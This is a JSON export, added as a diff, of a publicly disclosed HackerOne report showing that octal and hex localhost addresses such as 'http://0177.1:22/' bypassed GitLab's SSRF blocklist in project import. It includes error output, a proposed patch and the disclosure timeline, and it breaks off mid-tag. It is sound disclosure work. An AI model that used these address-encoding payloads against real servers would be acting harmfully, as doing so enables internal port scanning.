@@ -1,0 +1,1053 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-11-09T17:51:58.066Z", 
+    "voters": [
+        "sp1d3rs", 
+        "jensec", 
+        "ramsexy", 
+        "cdl", 
+        "ysx", 
+        "yumi", 
+        "eveeez", 
+        "babayaga_", 
+        "sup3r-b0y", 
+        "craxerbikash", 
+        "and 5 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 215105, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-11-09T02:57:40.774Z", 
+    "vulnerability_information": "Dear GitLab bug bounty team,\n\n# Summary\n---\n\nIt appears as though the fix to [!17286](https://gitlab.com/gitlab-org/gitlab-ce/issues/17286) can be easily bypassed. You have blocked the usage of `http://127.0.0.1`, `http://localhost/`, etc., but `http://0177.1/` and `http://0x7f.1/`, for instance, can still be used to scan internal ports.\n\n~~~\nError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository '[REPOS PATH]/{username}/{project}.git'...\nfatal: unable to access 'http://0177.1:22/': Recv failure: Connection reset by peer\n~~~\n\nAdmittedly, you have restricted the use of certain ports, but I still believe this needs to be fixed.\n\n# Fix\n---\n\nBlock decimal, octal and hex localhost notation.\n\nBest regards,\nEd", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "low", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "low", 
+            "availability": "none"
+        }, 
+        "rating": "medium", 
+        "score": 5.4, 
+        "author_type": "User"
+    }, 
+    "title": "SSRF vulnerability in gitlab.com via project import.", 
+    "is_member_of_team?": null, 
+    "vote_count": 15, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-12-09T02:57:40.841Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-21T16:54:00.048Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T16:54:00.048Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "The issue lies in `lib/gitlab/url_blocker.rb`:\n\n~~~ruby\ndef blocked_url?(url)\n        return false if url.nil?\n        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n        blocked_ips.concat(Socket.ip_address_list.map(&:ip_address))\n~~~\n\nLink to source code: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14\n\n# Patch\n---\n\n~~~diff\ndef blocked_url?(url)\n        return false if url.nil?\n-        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n+        blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\", \"0177.1\", \"0x7f.1\", \"127.1\"]\n        blocked_ips.concat(Socket.ip_address_list.map(&:ip_address))\n~~~", 
+            "markdown_message": "<p>The issue lies in <code>lib/gitlab/url_blocker.rb</code>:</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">blocked_url?</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">)</span>\n        <span class=\"k\">return</span> <span class=\"kp\">false</span> <span class=\"k\">if</span> <span class=\"n\">url</span><span class=\"p\">.</span><span class=\"nf\">nil?</span>\n        <span class=\"n\">blocked_ips</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"s2\">&quot;127.0.0.1&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;::1&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;0.0.0.0&quot;</span><span class=\"p\">]</span>\n        <span class=\"n\">blocked_ips</span><span class=\"p\">.</span><span class=\"nf\">concat</span><span class=\"p\">(</span><span class=\"no\">Socket</span><span class=\"p\">.</span><span class=\"nf\">ip_address_list</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"ss\">:ip_address</span><span class=\"p\">))</span>\n</code></pre>\n<p>Link to source code: <a title=\"https://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14\" href=\"/redirect?signature=dfda947bea0de632391a67f3cfb0d42679db5ffa&amp;url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab-ce%2Fblob%2Fmaster%2Flib%2Fgitlab%2Furl_blocker.rb%23L10-14\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gitlab.com/gitlab-org/gitlab-ce/blob/master/lib/gitlab/url_blocker.rb#L10-14</span><i class=\"icon-external-link\"></i></a></p>\n\n<h1 id=\"patch\">Patch</h1>\n\n<hr>\n<pre class=\"highlight diff\"><code>def blocked_url?(url)\n        return false if url.nil?\n<span class=\"gd\">-        blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;]\n</span><span class=\"gi\">+        blocked_ips = [&quot;127.0.0.1&quot;, &quot;::1&quot;, &quot;0.0.0.0&quot;, &quot;0177.1&quot;, &quot;0x7f.1&quot;, &quot;127.1&quot;]\n</span>        blocked_ips.concat(Socket.ip_address_list.map(&amp;:ip_address))\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 1555007, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-21T18:09:40.425Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T18:09:40.425Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edio,\n\nThose versions of an IP address should be converted to \"127.0.0.1\" by the resolver. This is what I see:\n\n```\nirb(main):005:0> uri = Addressable::URI.parse(\"http://0177.1/\")\n=> #<Addressable::URI:0x3fb2045ee390 URI:http://0177.1/>\nirb(main):006:0> uri.hostname\n=> \"0177.1\"\nirb(main):008:0> ips = Resolv.getaddresses(uri.hostname)\n=> [\"127.0.0.1\"]\nirb(main):009:0> uri = Addressable::URI.parse(\"http://0x7f.1/\")\n=> #<Addressable::URI:0x3fb2014c35cc URI:http://0x7f.1/>\nirb(main):010:0> uri.hostname\n=> \"0x7f.1\"\nirb(main):011:0> ips = Resolv.getaddresses(uri.hostname)\n=> [\"127.0.0.1\"]\n```\n\nWhat you might be seeing is that after an upgrade not all services restarted. This actually happened to me when I was testing your report. Try rebooting the host and running another import. Let me know if you're still seeing an issue.\n\nThanks!\n\n", 
+            "markdown_message": "<p>Hi <a href=\"/edio\">@edio</a>,</p>\n\n<p>Those versions of an IP address should be converted to &quot;127.0.0.1&quot; by the resolver. This is what I see:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):005:0&gt; uri = Addressable::URI.parse(&quot;http://0177.1/&quot;)\n=&gt; #&lt;Addressable::URI:0x3fb2045ee390 URI:http://0177.1/&gt;\nirb(main):006:0&gt; uri.hostname\n=&gt; &quot;0177.1&quot;\nirb(main):008:0&gt; ips = Resolv.getaddresses(uri.hostname)\n=&gt; [&quot;127.0.0.1&quot;]\nirb(main):009:0&gt; uri = Addressable::URI.parse(&quot;http://0x7f.1/&quot;)\n=&gt; #&lt;Addressable::URI:0x3fb2014c35cc URI:http://0x7f.1/&gt;\nirb(main):010:0&gt; uri.hostname\n=&gt; &quot;0x7f.1&quot;\nirb(main):011:0&gt; ips = Resolv.getaddresses(uri.hostname)\n=&gt; [&quot;127.0.0.1&quot;]\n</code></pre>\n<p>What you might be seeing is that after an upgrade not all services restarted. This actually happened to me when I was testing your report. Try rebooting the host and running another import. Let me know if you&#39;re still seeing an issue.</p>\n\n<p>Thanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1555258, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-21T19:08:05.491Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T19:08:05.491Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nI am fairly sure this fix can still be bypassed. What response do you get when importing `http://0177.1:22/`?\n\nI get the same as strukt got in their report:\n\n~~~\nError importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository '[REPOS PATH]/{username}/{project}.git'...\nfatal: unable to access 'http://0177.1:22/': Recv failure: Connection reset by peer\n~~~\n\nBest regards,\nEd", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>I am fairly sure this fix can still be bypassed. What response do you get when importing <code>http://0177.1:22/</code>?</p>\n\n<p>I get the same as strukt got in their report:</p>\n<pre class=\"highlight plaintext\"><code>Error importing repository http://0177.1:22/ into {username}/{project} - Cloning into bare repository &#39;[REPOS PATH]/{username}/{project}.git&#39;...\nfatal: unable to access &#39;http://0177.1:22/&#39;: Recv failure: Connection reset by peer\n</code></pre>\n<p>Best regards,<br>\nEd</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1555465, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/170/372/10dce51ee041681515bd498df894abe0c5c32005/import_error.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223005Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=afb6eb4665c285e7c9132255e42242fc8d07189b11f66c2b6c99739b9f796c97", 
+                    "type": "image/png", 
+                    "id": 170372, 
+                    "filename": "import_error.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-03-21T19:43:07.935Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T19:43:07.935Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edio,\n\nI've attached a screencap of what I see when I try to import a project from `http://0177.1:22/` using GitLab 8.17.4. The SSRF code works as intended.\n\nI saw the same thing you did when I first ran the upgrade, but after rebooting it was no longer possible to import from that IP.", 
+            "markdown_message": "<p>Hi <a href=\"/edio\">@edio</a>,</p>\n\n<p>I&#39;ve attached a screencap of what I see when I try to import a project from <code>http://0177.1:22/</code> using GitLab 8.17.4. The SSRF code works as intended.</p>\n\n<p>I saw the same thing you did when I first ran the upgrade, but after rebooting it was no longer possible to import from that IP.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1555558, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-21T19:53:09.843Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T19:53:09.843Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nWhoops! I guess as you pointed out I just need to reboot. \n\nWhat about https://gitlab.com? Is that still vulnerable?\n\nBest regards,\nEd", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>Whoops! I guess as you pointed out I just need to reboot. </p>\n\n<p>What about <a title=\"https://gitlab.com\" href=\"/redirect?signature=6b3208107c8bc52250da0488e72f237fdd601f5b&amp;url=https%3A%2F%2Fgitlab.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gitlab.com</span><i class=\"icon-external-link\"></i></a>? Is that still vulnerable?</p>\n\n<p>Best regards,<br>\nEd</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1555576, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-21T20:31:45.759Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-21T20:31:45.759Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I've done some more digging and it looks like this is a DNS issue. Some servers return \"127.0.0.1\" for a lookup against \"0771.1\" while others return no value. I'll do some more research and keep you updated.", 
+            "markdown_message": "<p>I&#39;ve done some more digging and it looks like this is a DNS issue. Some servers return &quot;127.0.0.1&quot; for a lookup against &quot;0771.1&quot; while others return no value. I&#39;ll do some more research and keep you updated.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1555643, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-29T18:10:14.844Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-29T18:10:14.844Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nI was checking on the status of this report and I was wondering if you could give me an update. Is there anything that I can do to help?\n\nBest regards,\nEd", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>I was checking on the status of this report and I was wondering if you could give me an update. Is there anything that I can do to help?</p>\n\n<p>Best regards,<br>\nEd</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1571144, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-29T19:12:15.888Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-29T19:12:15.888Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "@edio,\n\nNothing to report just yet. It's still being investigated.", 
+            "markdown_message": "<p><a href=\"/edio\">@edio</a>,</p>\n\n<p>Nothing to report just yet. It&#39;s still being investigated.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1571293, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-05T15:00:29.581Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-05T15:00:29.581Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 1730518, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-30T22:26:27.652Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-30T22:26:27.652Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edio,\n\nWe've come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon. Thanks for your patience!", 
+            "markdown_message": "<p>Hi <a href=\"/edio\">@edio</a>,</p>\n\n<p>We&#39;ve come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon. Thanks for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1878515, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-30T18:17:31.100Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-30T18:17:31.100Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edio,\n\nNo updates just yet, I'm sorry to say. Just checking back in so you don't think we've forgotten about the issue.", 
+            "markdown_message": "<p>Hi <a href=\"/edio\">@edio</a>,</p>\n\n<p>No updates just yet, I&#39;m sorry to say. Just checking back in so you don&#39;t think we&#39;ve forgotten about the issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1967058, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-09-24T09:12:55.952Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-09-24T09:12:55.952Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Could you please give me an update? Is there anything that I can do to help?", 
+            "markdown_message": "<p>Could you please give me an update? Is there anything that I can do to help?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2018417, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-09-25T03:26:54.103Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-09-25T03:26:54.103Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "@edio,\n\nNo, nothing you can help with at the moment. We were a bit overwhelmed with security patches in our last security release due to the back-to-back critical releases that preceded it. I'm hoping to get this included in our next security release which should go out in 1-2 weeks. Sorry for the delay!", 
+            "markdown_message": "<p><a href=\"/edio\">@edio</a>,</p>\n\n<p>No, nothing you can help with at the moment. We were a bit overwhelmed with security patches in our last security release due to the back-to-back critical releases that preceded it. I&#39;m hoping to get this included in our next security release which should go out in 1-2 weeks. Sorry for the delay!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2019368, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-19T15:27:08.707Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-19T15:27:08.707Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I plan on disclosing this report in 15 days (**Friday, 3 November 2017**). Hopefully you can resolve this issue by then. My aim is to give your users a chance to patch the issue on their own if you cannot fix it in time.", 
+            "markdown_message": "<p>I plan on disclosing this report in 15 days (<strong>Friday, 3 November 2017</strong>). Hopefully you can resolve this issue by then. My aim is to give your users a chance to patch the issue on their own if you cannot fix it in time.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2084716, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=921a2fb7721d3c2991dea327c3ce68361fcad813b2ee566067319de5a057c316", 
+                    "type": "image/png", 
+                    "id": 230832, 
+                    "filename": "Screenshot_from_2017-10-19_18-07-53.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-10-19T16:08:39.582Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-19T16:08:39.582Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "> We've come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon.\n\n@jobert suggested using https://github.com/jtdowney/private_address_check.\n\n{F230832}", 
+            "markdown_message": "<blockquote>\n<p>We&#39;ve come up with a proposed solution to this problem that involves checking for DNS resolution when the import is processed and should have something out very soon.</p>\n</blockquote>\n\n<p><a href=\"/jobert\">@jobert</a> suggested using <a title=\"https://github.com/jtdowney/private_address_check\" href=\"/redirect?signature=cf9a2ba2fc7deac6642228a844a1c292363e3cda&amp;url=https%3A%2F%2Fgithub.com%2Fjtdowney%2Fprivate_address_check\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/jtdowney/private_address_check</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_from_2017-10-19_18-07-53.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=921a2fb7721d3c2991dea327c3ce68361fcad813b2ee566067319de5a057c316\" data-attachment-type=\"image/png\"><img 